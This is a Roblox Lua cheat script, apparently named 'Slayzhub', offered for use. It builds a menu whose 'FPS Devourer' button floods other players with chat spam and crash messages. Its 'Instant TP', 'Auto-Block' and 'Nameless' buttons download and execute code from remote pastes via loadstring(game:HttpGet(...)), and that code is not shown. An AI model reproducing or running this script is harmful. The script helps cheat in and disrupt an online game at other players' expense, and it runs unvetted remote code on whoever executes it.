-- SLAYZHUB XENO GO v4.2 🔥 INTERFACE MODERNE PREMIUM
-- Design vert-noir moderne

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Anti-crash system
local antiCrashActive = false
local safeFolder = Instance.new("Folder")
safeFolder.Name = "SlayzSafe"
safeFolder.Parent = workspace

-- Nettoyage anti-crash
spawn(function()
    while wait(0.5) do
        pcall(function()
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") then
                    if obj.Parent ~= safeFolder then
                        obj:Destroy()
                    end
                end
            end
        end)
    end
end)

-- ScreenGui principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SlayzHubModern"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 2147483647
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Frame principale
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 450, 0, 380)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -190)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- Header avec titre
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 12)
HeaderCorner.Parent = Header

local HeaderMask = Instance.new("Frame")
HeaderMask.Size = UDim2.new(1, 0, 0, 12)
HeaderMask.Position = UDim2.new(0, 0, 1, -12)
HeaderMask.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
HeaderMask.BorderSizePixel = 0
HeaderMask.Parent = Header

-- Titre
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -120, 1, 0)
TitleLabel.Position = UDim2.new(0, 15, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Slayzhub"
TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
TitleLabel.TextSize = 20
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = Header

-- Sous-titre
local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Size = UDim2.new(1, -120, 0, 15)
SubtitleLabel.Position = UDim2.new(0, 15, 1, -18)
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.Text = "Made By Slayzhub ♥"
SubtitleLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
SubtitleLabel.TextSize = 11
SubtitleLabel.Font = Enum.Font.Gotham
SubtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
SubtitleLabel.Parent = Header

-- Bouton fermer
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -45, 0, 7)
CloseButton.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.TextSize = 22
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = Header

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseButton

-- Container principal
local Container = Instance.new("Frame")
Container.Size = UDim2.new(1, -20, 1, -70)
Container.Position = UDim2.new(0, 10, 0, 60)
Container.BackgroundTransparency = 1
Container.Parent = MainFrame

-- Barre d'onglets horizontale
local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, 0, 0, 45)
TabBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TabBar.BorderSizePixel = 0
TabBar.Parent = Container

local TabBarCorner = Instance.new("UICorner")
TabBarCorner.CornerRadius = UDim.new(0, 8)
TabBarCorner.Parent = TabBar

-- Layout pour les onglets horizontaux
local TabLayout = Instance.new("UIListLayout")
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.Padding = UDim.new(0, 5)
TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabLayout.Parent = TabBar

local TabPadding = Instance.new("UIPadding")
TabPadding.PaddingLeft = UDim.new(0, 5)
TabPadding.PaddingRight = UDim.new(0, 5)
TabPadding.PaddingTop = UDim.new(0, 5)
TabPadding.PaddingBottom = UDim.new(0, 5)
TabPadding.Parent = TabBar

-- Fonction pour créer un onglet horizontal
local function createTab(name, text, order)
    local Tab = Instance.new("TextButton")
    Tab.Name = name
    Tab.Size = UDim2.new(0, 100, 1, -10)
    Tab.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Tab.BorderSizePixel = 0
    Tab.Text = text
    Tab.TextColor3 = Color3.fromRGB(120, 120, 120)
    Tab.TextSize = 14
    Tab.Font = Enum.Font.GothamBold
    Tab.LayoutOrder = order
    Tab.AutoButtonColor = false
    Tab.Parent = TabBar
    
    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 6)
    TabCorner.Parent = Tab
    
    return Tab
end

-- Création des onglets
local PremiumTab = createTab("PremiumTab", "Premium", 1)
local ESPTab = createTab("ESPTab", "ESP", 2)

-- Zone de contenu
local ContentFrame = Instance.new("Frame")
ContentFrame.Size = UDim2.new(1, 0, 1, -55)
ContentFrame.Position = UDim2.new(0, 0, 0, 55)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = Container

-- Contenu Premium
local PremiumContent = Instance.new("ScrollingFrame")
PremiumContent.Name = "PremiumContent"
PremiumContent.Size = UDim2.new(1, 0, 1, 0)
PremiumContent.BackgroundTransparency = 1
PremiumContent.BorderSizePixel = 0
PremiumContent.ScrollBarThickness = 4
PremiumContent.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 100)
PremiumContent.CanvasSize = UDim2.new(0, 0, 0, 0)
PremiumContent.Visible = true
PremiumContent.Parent = ContentFrame

local PremiumLayout = Instance.new("UIListLayout")
PremiumLayout.Padding = UDim.new(0, 8)
PremiumLayout.SortOrder = Enum.SortOrder.LayoutOrder
PremiumLayout.Parent = PremiumContent

local PremiumPadding = Instance.new("UIPadding")
PremiumPadding.PaddingTop = UDim.new(0, 10)
PremiumPadding.PaddingLeft = UDim.new(0, 5)
PremiumPadding.PaddingRight = UDim.new(0, 10)
PremiumPadding.Parent = PremiumContent

-- Contenu ESP
local ESPContent = Instance.new("Frame")
ESPContent.Name = "ESPContent"
ESPContent.Size = UDim2.new(1, 0, 1, 0)
ESPContent.BackgroundTransparency = 1
ESPContent.Visible = false
ESPContent.Parent = ContentFrame

local ESPPlaceholder = Instance.new("TextLabel")
ESPPlaceholder.Size = UDim2.new(1, -20, 0, 100)
ESPPlaceholder.Position = UDim2.new(0, 10, 0.5, -50)
ESPPlaceholder.BackgroundTransparency = 1
ESPPlaceholder.Text = "🚧 ESP Features\nComing Soon..."
ESPPlaceholder.TextColor3 = Color3.fromRGB(80, 80, 80)
ESPPlaceholder.TextSize = 16
ESPPlaceholder.Font = Enum.Font.GothamBold
ESPPlaceholder.Parent = ESPContent

-- Fonction pour créer un bouton de fonction
local function createFeatureButton(name, text, order)
    local Button = Instance.new("TextButton")
    Button.Name = name
    Button.Size = UDim2.new(1, 0, 0, 45)
    Button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Button.BorderSizePixel = 0
    Button.Text = ""
    Button.LayoutOrder = order
    Button.AutoButtonColor = false
    Button.Parent = PremiumContent
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = Button
    
    local ButtonLabel = Instance.new("TextLabel")
    ButtonLabel.Size = UDim2.new(1, -50, 1, 0)
    ButtonLabel.Position = UDim2.new(0, 12, 0, 0)
    ButtonLabel.BackgroundTransparency = 1
    ButtonLabel.Text = text
    ButtonLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    ButtonLabel.TextSize = 14
    ButtonLabel.Font = Enum.Font.Gotham
    ButtonLabel.TextXAlignment = Enum.TextXAlignment.Left
    ButtonLabel.Parent = Button
    
    local StatusCircle = Instance.new("Frame")
    StatusCircle.Size = UDim2.new(0, 10, 0, 10)
    StatusCircle.Position = UDim2.new(1, -22, 0.5, -5)
    StatusCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    StatusCircle.BorderSizePixel = 0
    StatusCircle.Parent = Button
    
    local CircleCorner = Instance.new("UICorner")
    CircleCorner.CornerRadius = UDim.new(1, 0)
    CircleCorner.Parent = StatusCircle
    
    -- Effet hover
    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        }):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        }):Play()
    end)
    
    return Button, StatusCircle
end

-- Création des boutons de fonctionnalités
local FPSDevourerBtn, FPSDevourerCircle = createFeatureButton("FPSDevourer", "FPS Devourer", 1)
local InstantTPBtn, InstantTPCircle = createFeatureButton("InstantTP", "Instant TP", 2)
local AutoBlockBtn, AutoBlockCircle = createFeatureButton("AutoBlock", "Auto-Block", 3)
local NamelessBtn, NamelessCircle = createFeatureButton("Nameless", "Nameless", 4)

-- Auto-ajuster la taille du canvas
PremiumLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    PremiumContent.CanvasSize = UDim2.new(0, 0, 0, PremiumLayout.AbsoluteContentSize.Y + 20)
end)

-- Fonction pour changer d'onglet
local currentTab = "Premium"
local function switchTab(tab)
    if tab == "Premium" then
        TweenService:Create(PremiumTab, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 255, 100),
            TextColor3 = Color3.fromRGB(0, 0, 0)
        }):Play()
        PremiumContent.Visible = true
        
        TweenService:Create(ESPTab, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(20, 20, 20),
            TextColor3 = Color3.fromRGB(120, 120, 120)
        }):Play()
        ESPContent.Visible = false
        
        currentTab = "Premium"
    elseif tab == "ESP" then
        TweenService:Create(ESPTab, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 255, 100),
            TextColor3 = Color3.fromRGB(0, 0, 0)
        }):Play()
        ESPContent.Visible = true
        
        TweenService:Create(PremiumTab, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(20, 20, 20),
            TextColor3 = Color3.fromRGB(120, 120, 120)
        }):Play()
        PremiumContent.Visible = false
        
        currentTab = "ESP"
    end
end

-- Events des onglets
PremiumTab.MouseButton1Click:Connect(function()
    switchTab("Premium")
end)

ESPTab.MouseButton1Click:Connect(function()
    switchTab("ESP")
end)

-- Activer Premium par défaut
switchTab("Premium")

-- Fonctions de chargement sécurisées
local function safeLoadstring(url)
    pcall(function()
        loadstring(game:HttpGet(url, true))()
    end)
end

-- Fonction pour animer le cercle de statut
local function activateButton(circle)
    TweenService:Create(circle, TweenInfo.new(0.3), {
        BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    }):Play()
end

-- Events des boutons
FPSDevourerBtn.MouseButton1Click:Connect(function()
    antiCrashActive = true
    activateButton(FPSDevourerCircle)
    
    spawn(function()
        for i = 1, 50 do
            pcall(function()
                local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if remote then
                    remote.SayMessageRequest:FireServer("💀 CRASHED BY SLAYZHUB", "All")
                end
            end)
            wait(0.05)
        end
    end)
end)

InstantTPBtn.MouseButton1Click:Connect(function()
    activateButton(InstantTPCircle)
    safeLoadstring("https://pandadevelopment.net/virtual/file/3e58fa5b69bab3b3")
end)

AutoBlockBtn.MouseButton1Click:Connect(function()
    activateButton(AutoBlockCircle)
    safeLoadstring("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer")
end)

NamelessBtn.MouseButton1Click:Connect(function()
    activateButton(NamelessCircle)
    safeLoadstring("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr")
end)

CloseButton.MouseButton1Click:Connect(function()
    antiCrashActive = false
    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    wait(0.3)
    ScreenGui:Destroy()
end)

-- Système de déplacement
local dragging = false
local dragStart = nil
local startPos = nil

Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

Header.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Animation d'entrée
MainFrame.Size = UDim2.new(0, 0, 0, 0)
wait(0.1)
TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 450, 0, 380)
}):Play()

print("🔥 SLAYZHUB v4.2 LOADED - GREEN EDITION!")
